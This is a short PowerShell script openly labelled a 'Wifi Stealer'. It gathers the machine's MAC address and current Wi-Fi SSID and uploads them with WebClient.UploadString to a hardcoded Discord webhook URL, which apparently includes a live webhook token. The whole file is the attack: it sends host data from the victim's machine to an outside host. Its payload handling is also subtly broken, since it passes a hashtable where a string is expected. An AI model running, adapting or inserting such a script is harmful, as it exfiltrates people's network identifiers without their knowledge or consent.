$Client = New-Object System.Net.WebClient

$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -Match "True"}).MACAddress

$ssid = (netsh wlan show interfaces | Select-String "SSID").ToString().Split(":")[1]

$wifiInfo = "SSID: $ssid | MAC Address: $mac"

$discordWebhookUrl = "https://discord.com/api/webhooks/1056914005836447754/ZJaAvwdy9lcO9fcURaOWTPDeBf3rZWYb0Xdyo7H42EVAkBRXlfzYEtP-E5sF4AupIMTR"

$data = @{
    "content" = "Wifi Stealer Info: $wifiInfo"
}

$Client.UploadString($discordWebhookUrl, $data)
